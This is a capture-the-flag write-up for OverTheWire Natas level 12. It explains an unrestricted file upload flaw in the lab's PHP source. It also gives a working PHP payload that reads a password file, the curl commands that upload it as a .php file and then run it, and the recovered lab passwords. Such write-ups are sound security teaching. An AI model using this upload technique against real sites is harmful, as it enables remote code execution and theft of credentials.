---
title: "Natas 12 - Unrestricted File Upload"
date: 2026-04-11T13:36:15-05:00
draft: false
toc: false
images:
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas12`
- **Password:** `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
- **URL:** <http://natas12.natas.labs.overthewire.org>

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/
```

Body:

```html
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="pp6m1a1b01.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

Inspect `index-source.html` first.

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/index-source.html | w3m -T text/html
```

Body:

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path
)) {
            echo "The file <a href=\"$target_path\">$target_path</a>
 has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

Lets go line by line starting with `genRandomString()`.

`genRandomString()` creates 10-char random basename.

`makeRandomPath()` builds path like `upload/<random>.<ext>` and avoids collisions.

Important part: `makeRandomPathFromFilename()` gets extension from `$_POST["filename"]`, not from uploaded file content or MIME type:

```php
$ext = pathinfo($fn, PATHINFO_EXTENSION);
return makeRandomPath($dir, $ext);
```

Upload logic only checks file size (`<= 1000`) then calls `move_uploaded_file(...)`. No server-side check for real JPEG bytes, MIME, or allowed extension list.

So exploit is: send PHP payload in file body, and set form field `filename=shell.php`. Server trusts that field, extracts `php`, and stores upload as random `.php` file (`upload/<random>.php`). Then visiting that URL executes payload.

My file on disk is named `payload.jpeg` so it looks like what the form asks for, but the bytes are just PHP no real image check happens. Contents:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

Small enough to stay under the 1KB limit. The important part is `-F "uploadedfile=@payload.jpeg"` sends that body as-is; `-F "filename=shell.php"` is what picks `.php` for the saved path, not the `.jpeg` name.

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/ -F "uploadedfile=@payload.jpeg" -F "filename=shell.php"
```

Body:

```html
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/jtxk0t1v8n.php">upload/jtxk0t1v8n.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

Lets inspect `upload/jtxk0t1v8n.php` now.

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/upload/jtxk0t1v8n.php
```

Result:

```txt
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

Payload ran because server derived extension from attacker-controlled `filename` field, not from actual uploaded file validation. `filename=shell.php` forced `.php` extension on saved file, so web server executed it.

This worked because backend had only size check and trusted user input for extension.

**Password for natas13:** `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
